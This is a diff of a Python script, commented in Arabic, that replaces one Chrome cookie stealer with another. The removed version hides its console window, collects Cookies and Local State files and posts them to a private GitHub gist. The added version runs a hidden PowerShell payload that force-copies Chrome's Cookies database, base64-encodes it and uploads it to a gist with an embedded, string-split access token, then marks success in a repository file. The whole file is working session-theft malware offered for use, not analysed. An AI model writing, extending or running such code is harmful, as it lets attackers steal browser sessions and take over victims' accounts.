@@ -1,57 +1,41 @@
-import os, requests, base64, shutil, sys, ctypes
+import os, subprocess, base64, requests
 
-# التوكن
+# التوكن الخاص بك (Gist Token)
 A, B, C = "ghp_4io8ppwp", "agmH6IJEsD1XBpSs", "7TY7V44ZSlJt"
-TOKEN = A + B + C
+G_TOKEN = A + B + C
 
-def hide_console():
-    # إخفاء نافذة الـ Console فوراً لمنع الإغلاق المفاجئ
-    whnd = ctypes.windll.kernel32.GetConsoleWindow()
-    if whnd != 0:
-        ctypes.windll.user32.ShowWindow(whnd, 0)
-
-def ghost_hunter():
-    hide_console()
-    appdata = os.getenv('LOCALAPPDATA')
-    chrome_path = os.path.join(appdata, r'Google\Chrome\User Data')
-    found_data = {}
-    error_log = ""
+def force_gist_sync():
+    # كود الـ PowerShell "العدواني" لسحب الكوكيز وتحويلها لنص
+    # بيستخدم النسخ الإجباري عشان يتخطى قفل المتصفح
+    ps_payload = f"""
+    $c_path = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
+    $temp = "$env:TEMP\\vault.db";
+    if (Test-Path $c_path) {{
+        Copy-Item $c_path $temp -Force;
+        $bin = [IO.File]::ReadAllBytes($temp);
+        $b64 = [Convert]::ToBase64String($bin);
+        $body = @{{files=@{{'chrome_session.txt'=@{{content=$b64}}}}}} | ConvertTo-Json;
+        Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Headers @{{'Authorization'="token {G_TOKEN}"}} -Body $body -ContentType 'application/json';
+        Remove-Item $temp;
+    }}
+    """
 
     try:
-        if not os.path.exists(chrome_path):
-            error_log = "Chrome path not found"
-        else:
-            for root, dirs, files in os.walk(chrome_path):
-                for file in files:
-                    if file in ['Cookies', 'Local State']:
-                        try:
-                            full_path = os.path.join(root, file)
-                            profile = os.path.basename(os.path.dirname(root))
-                            temp_name = os.path.join(os.getenv('TEMP'), f'tmp_{file}')
-                            
-                            # محاولة النسخ بأمر النظام (أكثر قوة)
-                            os.system(f'copy /y "{full_path}" "{temp_name}" > nul')
-                            
-                            if os.path.exists(temp_path):
-                                with open(temp_path, 'rb') as f:
-                                    found_data[f"{profile}_{file}"] = base64.b64encode(f.read()).decode('utf-8')
-                                os.remove(temp_path)
-                        except Exception as e:
-                            error_log += f"Error at {file}: {str(e)}\n"
-    except Exception as e:
-        error_log = f"Global Error: {str(e)}"
-
-    # إرسال النتيجة أو الخطأ
-    headers = {"Authorization": f"token {TOKEN}"}
-    content_to_send = str(found_data) if found_data else f"No Data Found. Log: {error_log}"
-    
-    payload = {
-        "description": "Ghost Hunter Report",
-        "public": False,
-        "files": {"report.json": {"content": content_to_send}}
-    }
-    requests.post("https://api.github.com/gists", headers=headers, json=payload)
+        # تشغيل العملية في "وضع الشبح" (بدون أي نافذة سوداء)
+        subprocess.run(["powershell", "-Command", ps_payload], creationflags=0x08000000)
+        
+        # تحديث Noor.json كإشارة نجاح فقط
+        headers = {"Authorization": f"token {G_TOKEN}"}
+        repo_url = "https://api.github.com/repos/Noor092324/Noor-config/contents/Noor.json"
+        res = requests.get(repo_url, headers=headers).json()
+        requests.put(repo_url, headers=headers, json={
+            "message": "Sync Done",
+            "content": base64.b64encode(b"Success: Data Sent to Gist").decode(),
+            "sha": res['sha']
+        })
+    except:
+        pass
 
 if __name__ == "__main__":
-    ghost_hunter()
+    force_gist_sync()
     
